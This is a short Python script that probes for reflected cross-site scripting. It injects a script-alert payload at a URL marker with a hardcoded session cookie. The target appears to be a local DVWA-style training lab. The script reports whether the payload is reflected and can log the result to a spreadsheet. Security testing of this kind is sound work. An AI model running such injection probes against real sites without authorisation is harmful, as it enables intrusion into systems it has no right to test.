import requests
import xlwt
from datetime import datetime

def xss(URL, output):
    if "[*]" not in URL:
        print("URL-ul needs to have [*] as injection marker")
        return

    payload = "<script>alert('TestXSS')</script>"
    target_url = URL.replace("[*]", payload)

    cookies = {
        "PHPSESSID": "utvtq4rm217uu7984ma9l30ag1",
        "security": "low"
    }

    headers = {
        "Host": "localhost",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Connection": "keep-alive",
        "Referer": "http://localhost/vulnerabilities/xss_r/",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Priority": "u=0, i"
    }

    try:
        response = requests.get(target_url, headers=headers, cookies=cookies, timeout=10)

        print(f"Sent payload to: {response.url}")
        print(f"HTTP Status: {response.status_code}")

        reflected = payload in response.text

        if reflected:
            print("Possible XSS detected!")
        else:
            print("Payload was not reflected")

        if output:
            wb = xlwt.Workbook()
            sh = wb.add_sheet("XSS_Result")
            sh.write(0, 0, "URL")
            sh.write(0, 1, "Payload")
            sh.write(0, 2, "Status")
            sh.write(0, 3, "Reflected")

            sh.write(1, 0, response.url)
            sh.write(1, 1, payload)
            sh.write(1, 2, response.status_code)
            sh.write(1, 3, "Yes" if reflected else "No")

            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            wb.save(f"XSS_Result_{timestamp}.xls")

    except requests.exceptions.RequestException as e:
        print(f"[!] Error sending the request: {e}")
